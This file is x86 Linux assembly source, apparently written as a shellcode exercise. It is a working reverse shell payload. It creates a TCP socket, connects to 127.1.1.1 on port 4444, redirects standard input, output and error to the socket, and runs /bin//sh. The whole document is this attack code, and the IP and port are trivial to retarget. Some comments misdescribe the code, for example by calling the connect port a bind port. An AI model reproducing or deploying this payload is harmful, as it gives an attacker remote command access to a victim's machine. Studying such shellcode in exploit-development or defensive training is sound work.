global _start ; Making the entry point accessible

section .text
_start: ; Entry point

        ; This zeros out eax, ebx and edx

        xor ebx, ebx
        mul ebx

        mov al, 102 ; socketcall syscall
        mov bl, 1 ; socketcall type, socket

        ; Push the arguments of socket on to the stack
        push edx ; socket protocol 0x0 is moved on to the stack
        push byte 1 ; socket type 1 "SOCK_STREAM", is moved on to the stack
        push byte 2 ; socket domain 2 "PF_INET", is moved on to the stack

        mov ecx, esp ; ECX now points to all arguments of socket that are required by socketcall
        int 0x80 ; execute socket syscall

        mov edi, eax ; Saving the returned socket file descriptor in EDI from EAX

        ; populating the stack with arguments for the sockaddr_in structure

        push 0x0101017f ; IP address (127.1.1.1) is pushed on to the stack (8 bytes)
        push word 0x5c11 ; the port (4444) to bind to is pushed on to the stack (4 bytes)
        push word 2 ; the address family (PF_NET) is pushed on to the stack (4 bytes)

        mov ecx, esp

        push byte 16 ; the size of the struct in bytes is pushed on to the stack (16 bytes)
        push ecx ; *addr argument
        push edi ; sockfd argument

        mov ecx, esp ; arguments
        mov bl, 3 ; socketcall type, connect
        mov al, 102 ; socketcall syscall
        int 0x80
       
        mov ebx, edi ; oldfd argument - client socket file descriptor
        xor ecx, ecx
        mov cl, 2 ; placing two into the counter register to interate through the loop

        dup2:
        xor eax, eax
        mov al, 63 ; dup2 syscall
        int 0x80
        dec ecx ; newfd argument

        jns dup2 ; jump short to the start of loop if not signed (SF=0)

        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        mov edx, esp
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
